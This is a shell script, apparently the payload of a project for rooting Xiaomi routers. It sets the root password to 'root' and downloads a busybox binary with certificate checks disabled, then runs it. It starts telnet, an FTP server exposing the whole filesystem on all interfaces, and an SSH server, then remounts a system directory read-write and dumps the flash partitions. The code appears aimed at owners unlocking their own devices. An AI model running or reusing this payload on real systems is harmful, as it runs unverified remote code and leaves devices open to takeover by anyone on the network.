#!/bin/ash

set -euo pipefail

exploit() {
    ########################################
    # Download standalone busybox and start telnet and ftp servers
    ########################################

    # Override existing password, as the default one set by xiaomi is unknown
    # https://www.systutorials.com/changing-linux-users-password-in-one-command-line/
    echo -e "root\nroot" | passwd root 

    # kill/stop telnet, in case it is running from a previous execution
    pgrep busybox | xargs kill || true

    cd /tmp
    rm -rf busybox
    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
    curl "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel" --insecure --output busybox
    chmod +x busybox

    # Start telnet
    ./busybox telnetd

    # Start FTP server
    ln -sfn busybox ftpd # Create symlink needed for running ftpd
    ./busybox tcpsvd -vE 0.0.0.0 21 ./ftpd -Sw / >> /tmp/messages 2>&1 &

    echo "Done exploiting"
}

start_ssh() {
    cd /tmp

    # Clean
    rm -rf dropbear
    rm -rf dropbear.tar.bz2
    rm -rf /etc/dropbear

    # kill/stop dropbear, in case it is running from a previous execution
    pgrep dropbear | xargs kill || true

    # Donwload dropbear static mipsel binary
    curl "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/dropbear.tar.bz2" --insecure --output dropbear.tar.bz2
    /tmp/busybox tar -xvfj dropbear.tar.bz2

    # Add keys
    # http://www.ibiblio.org/elemental/howto/dropbear-ssh.html
    mkdir -p /etc/dropbear
    cd /etc/dropbear
    /tmp/dropbear/dropbearkey -t rsa -f dropbear_rsa_host_key
    /tmp/dropbear/dropbearkey -t dss -f dropbear_dss_host_key

    # Start SSH server
    /tmp/dropbear/dropbear

    # https://unix.stackexchange.com/a/402749
    # Login with ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@192.168.0.21
}

remount() {
    echo "Remount /usr/share/xiaoqiang as read-write"

    cp -R /usr/share/xiaoqiang /tmp/xiaoqiang
    mount --bind /tmp/xiaoqiang /usr/share/xiaoqiang

    echo "Done remounting"
}

# Function inspired by https://openwrt.org/docs/guide-user/installation/generic.backup#create_full_mtd_backup
mtd_backup() {
    TMPDIR="/tmp"
    BACKUP_DIR="${TMPDIR}/mtd_backup"
    OUTPUT_FILE="${TMPDIR}/mtd_backup.tgz"

    # Start
    echo "Start"
    rm -rf "${BACKUP_DIR}"
    mkdir -p "${BACKUP_DIR}"

    # List remote mtd devices from /proc/mtd. The first line is just a table
    # header, so skip it (using tail)
    cat /proc/mtd | tail -n+2 | while read; do
        MTD_DEV=$(echo ${REPLY} | cut -f1 -d:)
        MTD_NAME=$(echo ${REPLY} | cut -f2 -d\")
        echo "Backing up ${MTD_DEV} (${MTD_NAME})"
        dd if="/dev/${MTD_DEV}" of="${BACKUP_DIR}/${MTD_DEV}_${MTD_NAME}.bin"
    done
    
    # Do not compress, as the device runs out of storage for such operation
    echo "Done backing up"
}

# From https://stackoverflow.com/a/16159057
"$@"